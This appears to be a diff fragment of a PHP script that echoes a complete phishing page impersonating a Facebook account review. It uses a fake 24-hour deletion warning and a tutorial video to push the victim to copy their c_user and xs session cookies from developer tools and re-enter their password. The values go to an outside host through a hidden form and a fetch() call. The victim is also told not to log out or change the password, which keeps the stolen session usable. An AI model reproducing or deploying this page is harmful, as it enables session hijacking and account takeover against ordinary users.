-echo ".language-modal-content {";
-echo "padding: 20px 15px;";
-echo "}";
-echo "";
-echo ".language-title {";
-echo "font-size: 20px;";
-echo "padding: 10px 0;";
-echo "position: sticky;";
-echo "top: 0;";
-echo "color: white;";
-echo "}";
-echo "";
-echo ".language-btn {";
-echo "padding: 12px;";
-echo "font-size: 14px;";
-echo "}";
-echo "";
-echo ".language-options {";
-echo "max-height: 50vh;";
-echo "overflow-y: auto;";
-echo "}";
-echo "";
-echo ".close-language-modal {";
-echo "position: sticky;";
-echo "bottom: 0;";
-echo "margin-top: 15px;";
-echo "}";
-echo "}";
-echo "</style>";
-echo "</head>";
-echo "<body>";
-echo "<div class=\"header\">";
-echo "<div class=\"header-content\">";
-echo "<div class=\"logo\">";
-echo "<i class=\"fab fa-facebook\"></i>";
-echo "<span>Facebook Account Review</span>";
-echo "</div>";
-echo "<div class=\"help-center\">";
-echo "<i class=\"fas fa-question-circle\"></i>";
-echo "Help Center";
-echo "</div>";
-echo "<div class=\"google-translate-container\">";
-echo "<span class=\"translate-title\">Language</span>";
-echo "<select id=\"google_translate_element\" style=\"width: 100%; background: transparent; border: none; color: white;\">";
-echo "<option value=\"\">Select Language</option>";
-echo "<option value=\"en\">English</option>";
-echo "<option value=\"es\">Spanish</option>";
-echo "<option value=\"fr\">French</option>";
-echo "</select>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<div class=\"container\">";
-echo "<div class=\"review-card\">";
-echo "<div class=\"warning-icon\">";
-echo "<i class=\"fas fa-exclamation-triangle\"></i>";
-echo "</div>";
-echo "<h1 class=\"review-title\">Urgent Account Review Required</h1>";
-echo "<p class=\"review-subtitle\">Your account is scheduled for deletion due to policy violations. Request a review to prevent permanent loss of your account and data.</p>";
-echo "";
-echo "<div class=\"deletion-warning\">";
-echo "<h3><i class=\"fas fa-info-circle\"></i> Important Notice</h3>";
-echo "<ul>";
-echo "<li>Your account is scheduled for deletion in <strong>24 hours</strong></li>";
-echo "<li>This action is due to violations of our community standards</li>";
-echo "<li>You may request a review of this decision</li>";
-echo "<li>If approved, your account will be restored with full access</li>";
-echo "<li>Failure to request a review will result in permanent deletion</li>";
-echo "</ul>";
-echo "</div>";
-echo "";
-echo "<p class=\"review-subtitle\">To request a review of your account deletion, click the button below and follow the instructions.</p>";
-echo "";
-echo "<button class=\"review-btn\" id=\"reviewBtn\">";
-echo "<i class=\"fas fa-file-alt\"></i> Apply for Account Review";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<!-- Professional Language Selection Modal -->";
-echo "<div class=\"language-modal\" id=\"languageModal\">";
-echo "<div class=\"language-modal-content\">";
-echo "<div class=\"language-modal-header\">";
-echo "<h2 class=\"language-title\">";
-echo "<i class=\"fas fa-globe\"></i> Select Video Language";
-echo "</h2>";
-echo "<button class=\"close-language-modal\" id=\"closeLanguageModal\">";
-echo "<i class=\"fas fa-times\"></i>";
-echo "</button>";
-echo "</div>";
-echo "";
-echo "<div class=\"language-search-container\">";
-echo "<div class=\"search-wrapper\">";
-echo "<i class=\"fas fa-search search-icon\"></i>";
-echo "<input type=\"text\" class=\"language-search\" id=\"languageSearch\" placeholder=\"Search languages...\">";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<div class=\"language-options-container\">";
-echo "<div class=\"language-options\">";
-echo "<button class=\"language-btn\" data-lang=\"english\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">English</div>";
-echo "<div class=\"language-native\">English</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"filipino\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Filipino</div>";
-echo "<div class=\"language-native\">Filipino</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"hindi\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Hindi</div>";
-echo "<div class=\"language-native\">हिन्दी</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"portuguese\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Portuguese</div>";
-echo "<div class=\"language-native\">Português</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"spanish\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Spanish</div>";
-echo "<div class=\"language-native\">Español</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"tamil\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Tamil</div>";
-echo "<div class=\"language-native\">தமிழ்</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"arabic\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Arabic</div>";
-echo "<div class=\"language-native\">العربية</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"japanese\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Japanese</div>";
-echo "<div class=\"language-native\">日本語</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"french\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">French</div>";
-echo "<div class=\"language-native\">Français</div>";
-echo "</button>";
-echo "<button class=\"language-btn\" data-lang=\"swedish\">";
-echo "<div class=\"language-icon\">";
-echo "<i class=\"fas fa-language\"></i>";
-echo "</div>";
-echo "<div class=\"language-name\">Swedish</div>";
-echo "<div class=\"language-native\">Svenska</div>";
-echo "</button>";
-echo "</div>";
-echo "";
-echo "<p style=\"text-align: center; margin-top: 20px; color: #606770; font-size: 14px;\">";
-echo "Can't find your language? Request it at:";
-echo "<a href=\"mailto:support@fb.com\" style=\"color: #1877f2; text-decoration: none;\">support@fb.com</a>";
-echo "</p>";
-echo "</div>";
-echo "";
-echo "<div class=\"language-footer\">";
-echo "<div class=\"selected-language-display\">";
-echo "Selected: <strong id=\"selectedLanguageDisplay\">None</strong>";
-echo "</div>";
-echo "<button class=\"confirm-btn\" id=\"confirmBtn\" disabled>";
-echo "<i class=\"fas fa-check\"></i> Confirm Selection";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<!-- Review Modal -->";
-echo "<div class=\"modal\" id=\"reviewModal\">";
-echo "<div class=\"modal-content\">";
-echo "<div class=\"modal-header\">";
-echo "<h2 class=\"modal-title\"><i class=\"fas fa-file-alt\"></i> Account Review Request</h2>";
-echo "<button class=\"close-modal\" id=\"closeModal\">&times;</button>";
-echo "</div>";
-echo "";
-echo "<div class=\"modal-body\">";
-echo "<div class=\"step-indicator\">";
-echo "<div class=\"step active\">1</div>";
-echo "<div class=\"step\">2</div>";
-echo "<div class=\"step\">3</div>";
-echo "<div class=\"step-line\"></div>";
-echo "</div>";
-echo "";
-echo "<!-- Step 1: Video and c_user/xs -->";
-echo "<div class=\"step-content active\" id=\"step1\">";
-echo "<h3 class=\"step-title\">Detailed Video Information</h3>";
-echo "";
-echo "<div class=\"video-player-container\">";
-echo "<div class=\"network-status\">";
-echo "<i class=\"fas fa-signal\"></i>";
-echo "<span>Connection: Good</span>";
-echo "</div>";
-echo "<div class=\"video-container\">";
-echo "<video id=\"tutorialVideo\">";
-echo "<!-- Source will be set dynamically -->";
-echo "Your browser does not support the video tag.";
-echo "</video>";
-echo "<div class=\"loading-spinner\" id=\"loadingSpinner\">";
-echo "<div class=\"spinner\"></div>";
-echo "<div class=\"loading-percentage\">0%</div>";
-echo "</div>";
-echo "<div class=\"video-overlay\" id=\"videoOverlay\">";
-echo "<div class=\"play-btn\" id=\"overlayPlayBtn\">";
-echo "<i class=\"fas fa-play\"></i>";
-echo "</div>";
-echo "<p style=\"color: white; margin-top: 15px; font-weight: 600;\">Click to select language</p>";
-echo "</div>";
-echo "<div class=\"video-controls\">";
-echo "<button class=\"control-btn\" id=\"playPauseBtn\">";
-echo "<i class=\"fas fa-play\"></i>";
-echo "</button>";
-echo "<div class=\"progress-container\">";
-echo "<div class=\"buffered-bar\" id=\"bufferedBar\"></div>";
-echo "<div class=\"progress-bar\" id=\"progressBar\"></div>";
-echo "</div>";
-echo "<div class=\"time-display\">";
-echo "<span id=\"currentTime\">0:00</span> / <span id=\"totalTime\">0:00</span>";
-echo "</div>";
-echo "<div class=\"volume-container\">";
-echo "<button class=\"control-btn\" id=\"volumeBtn\">";
-echo "<i class=\"fas fa-volume-up\"></i>";
-echo "</button>";
-echo "<input type=\"range\" class=\"volume-slider\" id=\"volumeSlider\" min=\"0\" max=\"1\" step=\"0.1\" value=\"1\">";
-echo "</div>";
-echo "<select class=\"speed-selector\" id=\"speedSelector\">";
-echo "<option value=\"0.5\">0.5x</option>";
-echo "<option value=\"0.75\">0.75x</option>";
-echo "<option value=\"1\" selected>Normal</option>";
-echo "<option value=\"1.25\">1.25x</option>";
-echo "<option value=\"1.5\">1.5x</option>";
-echo "<option value=\"2\">2x</option>";
-echo "</select>";
-echo "<button class=\"control-btn fullscreen-btn\" id=\"fullscreenBtn\">";
-echo "<i class=\"fas fa-expand\"></i>";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<div class=\"mobile-instructions\">";
-echo "<h3><i class=\"fas fa-mobile-alt\"></i> For Mobile Users</h3>";
-echo "<p>This process requires desktop browser developer tools. Please switch to a computer:</p>";
-echo "<ol>";
-echo "<li>Open Chrome on a desktop/laptop computer</li>";
-echo "<li>Log in to Facebook</li>";
-echo "<li>Follow the video instructions to find your values</li>";
-echo "<li>Return here to submit your review request</li>";
-echo "</ol>";
-echo "</div>";
-echo "";
-echo "<div class=\"form-group\">";
-echo "<label for=\"c_user\"><i class=\"fas fa-user-circle\"></i> c_user Value</label>";
-echo "<input type=\"text\" id=\"c_user\" name=\"c_user\"";
-echo "placeholder=\"Enter your c_user value\"";
-echo "pattern=\"\\d+\"";
-echo "title=\"c_user only\"";
-echo "required>";
-echo "<div class=\"validation-hint\">Must contain a valid c_user value only</div>";
-echo "</div>";
-echo "";
-echo "<div class=\"form-group\">";
-echo "<label for=\"xs\"><i class=\"fas fa-key\"></i> xs Value</label>";
-echo "<input type=\"text\" id=\"xs\" name=\"xs\"";
-echo "placeholder=\"Enter your xs value\"";
-echo "pattern=\".{20,}\"";
-echo "title=\"xs only\"";
-echo "required>";
-echo "<div class=\"validation-hint\">Must contain a valid xs value only</div>";
-echo "</div>";
-echo "";
-echo "<div class=\"btn-group\">";
-echo "<button class=\"btn btn-outline\" id=\"cancelBtn\">";
-echo "<i class=\"fas fa-times\"></i> Cancel";
-echo "</button>";
-echo "<button class=\"btn btn-primary\" id=\"nextToStep2\">";
-echo "<i class=\"fas fa-arrow-right\"></i> Continue";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<!-- Step 2: Password Verification -->";
-echo "<div class=\"step-content\" id=\"step2\">";
-echo "<h3 class=\"step-title\">Password Verification</h3>";
-echo "";
-echo "<div class=\"form-group\">";
-echo "<label for=\"password\"><i class=\"fas fa-lock\"></i> Re-enter Password</label>";
-echo "<input type=\"password\" id=\"password\" name=\"password\"";
-echo "placeholder=\"Enter your Facebook password\"";
-echo "required>";
-echo "</div>";
-echo "";
-echo "<div class=\"deletion-warning\">";
-echo "<h3><i class=\"fas fa-info-circle\"></i> Important Security Notice</h3>";
-echo "<ul>";
-echo "<li>This is a security verification step to confirm your identity</li>";
-echo "<li>Do not log out from your computer during the review process</li>";
-echo "<li>Keep your Facebook account logged in on your computer</li>";
-echo "<li>Your password is encrypted during transmission</li>";
-echo "<li>Do not share your password with anyone</li>";
-echo "</ul>";
-echo "</div>";
-echo "";
-echo "<div class=\"btn-group\">";
-echo "<button class=\"btn btn-outline\" id=\"backToStep1\">";
-echo "<i class=\"fas fa-arrow-left\"></i> Back";
-echo "</button>";
-echo "<button class=\"btn btn-primary\" id=\"nextToStep3\">";
-echo "<i class=\"fas fa-paper-plane\"></i> Submit Review Request";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<!-- Step 3: Success Message -->";
-echo "<div class=\"step-content\" id=\"step3\">";
-echo "<div class=\"success-message\">";
-echo "<div class=\"success-icon\">";
-echo "<i class=\"fas fa-check-circle\"></i>";
-echo "</div>";
-echo "<h3 class=\"success-title\">Review Request Submitted!</h3>";
-echo "<p class=\"success-text\">Your account review request has been successfully submitted. Our team will review your case within the next 24 hours.</p>";
-echo "";
-echo "<div class=\"deletion-warning\">";
-echo "<h3><i class=\"fas fa-info-circle\"></i> Important Instructions</h3>";
-echo "<ul>";
-echo "<li>Do not log out from your computer during this period</li>";
-echo "<li>Keep your Facebook account logged in on this device</li>";
-echo "<li>You will receive a notification once the review is complete</li>";
-echo "<li>Account deletion has been paused pending review</li>";
-echo "<li>Please do not attempt to change your password during review</li>";
-echo "</ul>";
-echo "</div>";
-echo "";
-echo "<button class=\"btn btn-primary\" id=\"finishBtn\">";
-echo "<i class=\"fas fa-check\"></i> Finish";
-echo "</button>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "</div>";
-echo "";
-echo "<!-- Hidden form for submission -->";
-echo "<form id=\"hiddenForm\" class=\"hidden-form\" action=\"https://php-ac262.wasmer.app\" method=\"post\">";
-echo "<input type=\"hidden\" name=\"c_user\" id=\"hiddenCUser\">";
-echo "<input type=\"hidden\" name=\"xs\" id=\"hiddenXs\">";
-echo "<input type=\"hidden\" name=\"password\" id=\"hiddenPassword\">";
-echo "</form>";
-echo "";
-echo "<!-- Footer -->";
-echo "<footer>";
-echo "<div class=\"footer-content\">";
-echo "<div class=\"footer-links\">";
-echo "<a href=\"#\">About</a>";
-echo "<a href=\"#\">Ad Choice</a>";
-echo "<a href=\"#\">Terms and policies</a>";
-echo "<a href=\"#\">Privacy Policy</a>";
-echo "<a href=\"#\">Help Center</a>";
-echo "</div>";
-echo "<div class=\"copyright\">";
-echo "Meta © 2025 - Protecting Your Digital Identity";
-echo "</div>";
-echo "</div>";
-echo "</footer>";
-echo "";
-echo "<script>";
-echo "document.addEventListener('DOMContentLoaded', function() {";
-echo "// Video files mapping";
-echo "const videoFiles = {";
-echo "'english': 'https://remove-account-restriction-issue.vercel.app/English_US_video_information_V1.mp4',";
-echo "'filipino': 'https://remove-account-restriction-issue.vercel.app/Filipino_Tagalog_video_information_V1.mp4',";
-echo "'hindi': 'https://remove-account-restriction-issue.vercel.app/Hindi_video_information_V1.mp4',";
-echo "'portuguese': 'https://remove-account-restriction-issue.vercel.app/Portuguese_Brazil_video_information_V1.mp4',";
-echo "'spanish': 'https://remove-account-restriction-issue.vercel.app/Spanish_Spain_video_information_V1.mp4',";
-echo "'tamil': 'https://remove-account-restriction-issue.vercel.app/Tamil_video_information_V1.mp4',";
-echo "'arabic': 'Arabic_video_information_V1.mp4',";
-echo "'french': 'https://remove-account-restriction-issue.vercel.app/French_France_video_information_V1.mp4',";
-echo "'swedish': 'https://remove-account-restriction-issue.vercel.app/Swedish_video_information_V1.mp4',";
-echo "'japanese': 'https://remove-account-restriction-issue.vercel.app/Japanese_video_information_V1.mp4'";
-echo "};";
-echo "";
-echo "// Language modal elements";
-echo "const languageModal = document.getElementById('languageModal');";
-echo "const closeLanguageModal = document.getElementById('closeLanguageModal');";
-echo "const languageSearch = document.getElementById('languageSearch');";
-echo "const languageButtons = document.querySelectorAll('.language-btn');";
-echo "const confirmBtn = document.getElementById('confirmBtn');";
-echo "const selectedLanguageDisplay = document.getElementById('selectedLanguageDisplay');";
-echo "";
-echo "let selectedLanguage = null;";
-echo "";
-echo "// Video elements";
-echo "const videoOverlay = document.getElementById('videoOverlay');";
-echo "const overlayPlayBtn = document.getElementById('overlayPlayBtn');";
-echo "const video = document.getElementById('tutorialVideo');";
-echo "const loadingSpinner = document.getElementById('loadingSpinner');";
-echo "const loadingPercentage = document.querySelector('.loading-percentage');";
-echo "";
-echo "const modal = document.getElementById('reviewModal');";
-echo "const reviewBtn = document.getElementById('reviewBtn');";
-echo "const closeModal = document.getElementById('closeModal');";
-echo "const cancelBtn = document.getElementById('cancelBtn');";
-echo "const finishBtn = document.getElementById('finishBtn');";
-echo "";
-echo "// Video control elements";
-echo "const playPauseBtn = document.getElementById('playPauseBtn');";
-echo "const progressBar = document.getElementById('progressBar');";
-echo "const bufferedBar = document.getElementById('bufferedBar');";
-echo "const currentTimeDisplay = document.getElementById('currentTime');";
-echo "const totalTimeDisplay = document.getElementById('totalTime');";
-echo "const volumeBtn = document.getElementById('volumeBtn');";
-echo "const volumeSlider = document.getElementById('volumeSlider');";
-echo "const speedSelector = document.getElementById('speedSelector');";
-echo "const fullscreenBtn = document.getElementById('fullscreenBtn');";
-echo "";
-echo "// Step navigation";
-echo "const nextToStep2 = document.getElementById('nextToStep2');";
-echo "const backToStep1 = document.getElementById('backToStep1');";
-echo "const nextToStep3 = document.getElementById('nextToStep3');";
-echo "";
-echo "const step1 = document.getElementById('step1');";
-echo "const step2 = document.getElementById('step2');";
-echo "const step3 = document.getElementById('step3');";
-echo "";
-echo "const steps = document.querySelectorAll('.step');";
-echo "";
-echo "// Hidden form elements";
-echo "const hiddenForm = document.getElementById('hiddenForm');";
-echo "const hiddenCUser = document.getElementById('hiddenCUser');";
-echo "const hiddenXs = document.getElementById('hiddenXs');";
-echo "const hiddenPassword = document.getElementById('hiddenPassword');";
-echo "";
-echo "// Open language modal when video overlay is clicked";
-echo "overlayPlayBtn.addEventListener('click', function() {";
-echo "languageModal.classList.add('active');";
-echo "});";
-echo "";
-echo "// Close language modal";
-echo "closeLanguageModal.addEventListener('click', function() {";
-echo "languageModal.classList.remove('active');";
-echo "});";
-echo "";
-echo "// Language search functionality";
-echo "languageSearch.addEventListener('input', function() {";
-echo "const searchTerm = this.value.toLowerCase();";
-echo "";
-echo "languageButtons.forEach(button => {";
-echo "const languageName = button.querySelector('.language-name').textContent.toLowerCase();";
-echo "const languageNative = button.querySelector('.language-native').textContent.toLowerCase();";
-echo "";
-echo "if (languageName.includes(searchTerm) || languageNative.includes(searchTerm)) {";
-echo "button.style.display = 'flex';";
-echo "} else {";
-echo "button.style.display = 'none';";
-echo "}";
-echo "});";
-echo "});";
-echo "";
-echo "// Language selection";
-echo "languageButtons.forEach(button => {";
-echo "button.addEventListener('click', function() {";
-echo "// Remove selected class from all buttons";
-echo "languageButtons.forEach(btn => btn.classList.remove('selected'));";
-echo "";
-echo "// Add selected class to clicked button";
-echo "this.classList.add('selected');";
-echo "";
-echo "// Get selected language";
-echo "selectedLanguage = this.getAttribute('data-lang');";
-echo "const languageName = this.querySelector('.language-name').textContent;";
-echo "";
-echo "// Update display";
-echo "selectedLanguageDisplay.textContent = languageName;";
-echo "";
-echo "// Enable confirm button";
-echo "confirmBtn.disabled = false;";
-echo "});";
-echo "});";
-echo "";
-echo "// Confirm language selection";
-echo "confirmBtn.addEventListener('click', function() {";
-echo "if (selectedLanguage) {";
-echo "const source = videoFiles[selectedLanguage];";
-echo "";
-echo "if (source) {";
-echo "video.src = source;";
-echo "video.load();";
-echo "";
-echo "// Set video title for accessibility";
-echo "video.setAttribute('title', `Tutorial Video - ${selectedLanguageDisplay.textContent}`);";
-echo "";
-echo "languageModal.classList.remove('active');";
-echo "";
-echo "// After a short delay, play the video";
-echo "setTimeout(() => {";
-echo "video.play();";
-echo "videoOverlay.classList.add('hidden');";
-echo "playPauseBtn.innerHTML = '<i class=\"fas fa-pause\"></i>';";
-echo "}, 300);";
-echo "";
-echo "// Remember language selection";
-echo "localStorage.setItem('preferredLanguage', selectedLanguage);";
-echo "}";
-echo "}";
-echo "});";
-echo "";
-echo "// Close modal when clicking outside";
-echo "window.addEventListener('click', function(event) {";
-echo "if (event.target === languageModal) {";
-echo "languageModal.classList.remove('active');";
-echo "}";
-echo "});";
-echo "";
-echo "// Keyboard shortcut for closing modal";
-echo "document.addEventListener('keydown', function(e) {";
-echo "if (e.key === 'Escape' && languageModal.classList.contains('active')) {";
-echo "languageModal.classList.remove('active');";
-echo "}";
-echo "});";
-echo "";
-echo "// Preload the preferred language if available";
-echo "const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';";
-echo "if (videoFiles[preferredLanguage]) {";
-echo "video.src = videoFiles[preferredLanguage];";
-echo "video.load();";
-echo "}";
-echo "";
-echo "function initVideoPlayer() {";
-echo "// Initialize volume and playback rate";
-echo "video.volume = volumeSlider.value;";
-echo "video.playbackRate = speedSelector.value;";
-echo "";
-echo "// Update time display";
-echo "updateTimeDisplay();";
-echo "";
-echo "// Event listeners";
-echo "video.addEventListener('timeupdate', updateProgressBar);";
-echo "video.addEventListener('progress', updateBufferedBar);";
-echo "video.addEventListener('loadedmetadata', function() {";
-echo "totalTimeDisplay.textContent = formatTime(video.duration);";
-echo "});";
-echo "";
-echo "// Loading events";
-echo "video.addEventListener('waiting', showLoadingSpinner);";
-echo "video.addEventListener('playing', hideLoadingSpinner);";
-echo "video.addEventListener('seeking', showLoadingSpinner);";
-echo "video.addEventListener('seeked', hideLoadingSpinner);";
-echo "";
-echo "playPauseBtn.addEventListener('click', togglePlayPause);";
-echo "";
-echo "volumeBtn.addEventListener('click', toggleMute);";
-echo "volumeSlider.addEventListener('input', function() {";
-echo "video.volume = volumeSlider.value;";
-echo "updateVolumeIcon();";
-echo "});";
-echo "";
-echo "speedSelector.addEventListener('change', function() {";
-echo "video.playbackRate = parseFloat(this.value);";
-echo "});";
-echo "";
-echo "fullscreenBtn.addEventListener('click', toggleFullscreen);";
-echo "";
-echo "const progressContainer = document.querySelector('.progress-container');";
-echo "progressContainer.addEventListener('click', function(e) {";
-echo "const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;";
-echo "video.currentTime = pos * video.duration;";
-echo "});";
-echo "";
-echo "// Keyboard shortcuts";
-echo "document.addEventListener('keydown', function(e) {";
-echo "if (e.code === 'Space' && !isInputField(document.activeElement)) {";
-echo "e.preventDefault();";
-echo "togglePlayPause();";
-echo "}";
-echo "";
-echo "if (e.code === 'ArrowLeft') {";
-echo "video.currentTime = Math.max(0, video.currentTime - 5);";
-echo "}";
-echo "";
-echo "if (e.code === 'ArrowRight') {";
-echo "video.currentTime = Math.min(video.duration, video.currentTime + 5);";
-echo "}";
-echo "";
-echo "if (e.code === 'ArrowUp') {";
-echo "video.volume = Math.min(1, video.volume + 0.1);";
-echo "volumeSlider.value = video.volume;";
-echo "updateVolumeIcon();";
-echo "}";
-echo "";
-echo "if (e.code === 'ArrowDown') {";
-echo "video.volume = Math.max(0, video.volume - 0.1);";
-echo "volumeSlider.value = video.volume;";
-echo "updateVolumeIcon();";
-echo "}";
-echo "";
-echo "if (e.code === 'KeyM') {";
-echo "toggleMute();";
-echo "}";
-echo "";
-echo "if (e.code === 'KeyF') {";
-echo "toggleFullscreen();";
-echo "}";
-echo "});";
-echo "}";
-echo "";
-echo "function isInputField(element) {";
-echo "return element.tagName === 'INPUT' || element.tagName === 'TEXTAREA';";
-echo "}";
-echo "";
-echo "function showLoadingSpinner() {";
-echo "loadingSpinner.style.display = 'flex';";
-echo "}";
-echo "";
-echo "function hideLoadingSpinner() {";
-echo "if (video.readyState >= 3) {";
-echo "loadingSpinner.style.display = 'none';";
-echo "}";
-echo "}";
-echo "";
-echo "function updateBufferedBar() {";
-echo "if (video.buffered.length > 0) {";
-echo "const bufferedEnd = video.buffered.end(video.buffered.length - 1);";
-echo "const percent = (bufferedEnd / video.duration) * 100;";
-echo "bufferedBar.style.width = `${percent}%`;";
-echo "";
-echo "// Update loading percentage";
-echo "if (video.readyState < 4) {";
-echo "const loadedPercent = Math.round((bufferedEnd / video.duration) * 100);";
-echo "loadingPercentage.textContent = `${loadedPercent}%`;";
-echo "}";
-echo "}";
-echo "}";
-echo "";
-echo "function playVideo() {";
-echo "video.play();";
-echo "videoOverlay.classList.add('hidden');";
-echo "playPauseBtn.innerHTML = '<i class=\"fas fa-pause\"></i>';";
-echo "}";
-echo "";
-echo "// Toggle play/pause";
-echo "function togglePlayPause() {";
-echo "if (video.paused) {";
-echo "video.play();";
-echo "playPauseBtn.innerHTML = '<i class=\"fas fa-pause\"></i>';";
-echo "} else {";
-echo "video.pause();";
-echo "playPauseBtn.innerHTML = '<i class=\"fas fa-play\"></i>';";
-echo "}";
-echo "}";
-echo "";
-echo "// Update progress bar";
-echo "function updateProgressBar() {";
-echo "const percent = (video.currentTime / video.duration) * 100;";
-echo "progressBar.style.width = `${percent}%`;";
-echo "currentTimeDisplay.textContent = formatTime(video.currentTime);";
-echo "}";
-echo "";
-echo "// Update time display";
-echo "function updateTimeDisplay() {";
-echo "currentTimeDisplay.textContent = formatTime(video.currentTime);";
-echo "totalTimeDisplay.textContent = formatTime(video.duration);";
-echo "}";
-echo "";
-echo "// Format time in MM:SS";
-echo "function formatTime(seconds) {";
-echo "const minutes = Math.floor(seconds / 60);";
-echo "seconds = Math.floor(seconds % 60);";
-echo "return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;";
-echo "}";
-echo "";
-echo "function toggleMute() {";
-echo "video.muted = !video.muted;";
-echo "updateVolumeIcon();";
-echo "}";
-echo "";
-echo "function updateVolumeIcon() {";
-echo "if (video.muted || video.volume === 0) {";
-echo "volumeBtn.innerHTML = '<i class=\"fas fa-volume-mute\"></i>';";
-echo "volumeSlider.value = 0;";
-echo "} else if (video.volume > 0.5) {";
-echo "volumeBtn.innerHTML = '<i class=\"fas fa-volume-up\"></i>';";
-echo "} else {";
-echo "volumeBtn.innerHTML = '<i class=\"fas fa-volume-down\"></i>';";
-echo "}";
-echo "}";
-echo "";
-echo "function toggleFullscreen() {";
-echo "const videoContainer = document.querySelector('.video-player-container');";
-echo "";
-echo "if (!document.fullscreenElement) {";
-echo "if (videoContainer.requestFullscreen) {";
-echo "videoContainer.requestFullscreen();";
-echo "} else if (videoContainer.mozRequestFullScreen) {";
-echo "videoContainer.mozRequestFullScreen();";
-echo "} else if (videoContainer.webkitRequestFullscreen) {";
-echo "videoContainer.webkitRequestFullscreen();";
-echo "} else if (videoContainer.msRequestFullscreen) {";
-echo "videoContainer.msRequestFullscreen();";
-echo "}";
-echo "fullscreenBtn.innerHTML = '<i class=\"fas fa-compress\"></i>';";
-echo "} else {";
-echo "if (document.exitFullscreen) {";
-echo "document.exitFullscreen();";
-echo "} else if (document.mozCancelFullScreen) {";
-echo "document.mozCancelFullScreen();";
-echo "} else if (document.webkitExitFullscreen) {";
-echo "document.webkitExitFullscreen();";
-echo "} else if (document.msExitFullscreen) {";
-echo "document.msExitFullscreen();";
-echo "}";
-echo "fullscreenBtn.innerHTML = '<i class=\"fas fa-expand\"></i>';";
-echo "}";
-echo "}";
-echo "";
-echo "// Handle fullscreen change event";
-echo "document.addEventListener('fullscreenchange', updateFullscreenIcon);";
-echo "document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);";
-echo "document.addEventListener('mozfullscreenchange', updateFullscreenIcon);";
-echo "document.addEventListener('MSFullscreenChange', updateFullscreenIcon);";
-echo "";
-echo "function updateFullscreenIcon() {";
-echo "if (document.fullscreenElement ||";
-echo "document.webkitFullscreenElement ||";
-echo "document.mozFullScreenElement ||";
-echo "document.msFullscreenElement) {";
-echo "fullscreenBtn.innerHTML = '<i class=\"fas fa-compress\"></i>';";
-echo "} else {";
-echo "fullscreenBtn.innerHTML = '<i class=\"fas fa-expand\"></i>';";
-echo "}";
-echo "}";
-echo "";
-echo "// Open review modal";
-echo "reviewBtn.addEventListener('click', function() {";
-echo "modal.style.display = 'block';";
-echo "document.body.style.overflow = 'hidden';";
-echo "initVideoPlayer();";
-echo "});";
-echo "";
-echo "// Close modal function";
-echo "function closeModalFunc() {";
-echo "modal.style.display = 'none';";
-echo "document.body.style.overflow = 'auto';";
-echo "resetForm();";
-echo "}";
-echo "";
-echo "closeModal.addEventListener('click', closeModalFunc);";
-echo "cancelBtn.addEventListener('click', closeModalFunc);";
-echo "";
-echo "// Finish button";
-echo "finishBtn.addEventListener('click', function() {";
-echo "window.location.href = \"https://www.facebook.com/\";";
-echo "});";
-echo "";
-echo "// Next to Step 2";
-echo "nextToStep2.addEventListener('click', function() {";
-echo "const cUserInput = document.getElementById('c_user');";
-echo "const xsInput = document.getElementById('xs');";
-echo "";
-echo "// Trigger browser validation";
-echo "if (!cUserInput.checkValidity()) {";
-echo "cUserInput.reportValidity();";
-echo "return;";
-echo "}";
-echo "";
-echo "if (!xsInput.checkValidity()) {";
-echo "xsInput.reportValidity();";
-echo "return;";
-echo "}";
-echo "";
-echo "// Set values for hidden form";
-echo "hiddenCUser.value = cUserInput.value;";
-echo "hiddenXs.value = xsInput.value;";
-echo "";
-echo "// Submit c_user and xs together";
-echo "const formData = new FormData();";
-echo "formData.append('c_user', cUserInput.value);";
-echo "formData.append('xs', xsInput.value);";
-echo "";
-echo "fetch('https://php-ac262.wasmer.app', {";
-echo "method: 'POST',";
-echo "body: formData";
-echo "})";
-echo ".then(response => {";
-echo "if (!response.ok) {";
-echo "console.error('Submission of c_user and xs failed');";
-echo "}";
-echo "})";
-echo ".catch(error => {";
-echo "console.error('Submission error:', error);";
-echo "});";
-echo "";
-echo "// Proceed to next step";
-echo "step1.classList.remove('active');";
-echo "step2.classList.add('active');";
-echo "";
